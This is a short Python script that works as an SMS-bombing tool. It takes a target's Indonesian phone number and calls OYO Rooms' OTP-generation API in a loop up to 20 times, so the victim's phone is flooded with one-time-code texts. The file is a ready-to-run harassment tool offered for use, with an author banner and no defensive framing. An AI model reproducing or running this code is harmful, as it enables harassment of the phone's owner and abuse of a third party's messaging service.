import requests, os

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			 SPAM SMS OYOROOMS%s
 ,_     _‚
 |\\\___//|	%sAuthor: Budi.X-Code%s
 |=6   6=|	%sContact: 0895621953228%s
 \=._Y_.=/	%sGithub:  https://github.com/hackbae90%s
  )  `  (    ,	%sTEAM: BelidoClub (PalembangXcode)%s
 /       \  ((
 |       |   ))
/| |   | |\_//	%sSPECIAL THANKS TO: Sri Wahyuni%s
\| |._.| |/-`
 '"'   '"'
"""%(c,r,g,r,g,r,g,r,g,r,w,r))
i=int(0)
no=input("%sMasukan No Target => %s"%(g,w))
while True:
	idk=('status')
	r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
	if str(idk) in str(r.text):
		print("[+] SUKSES")
	else:
		print("[-] GAGAL")
		print("%s[!] GANTI TARGET, UDAH LIMIT COK DJANCOK"%(r))
		break
	i+=1
	if i == 20:
		print("%s[!] LIMIT SUDAH TERCAPAI COBA LAGI BESOK:)"%(r))
		break
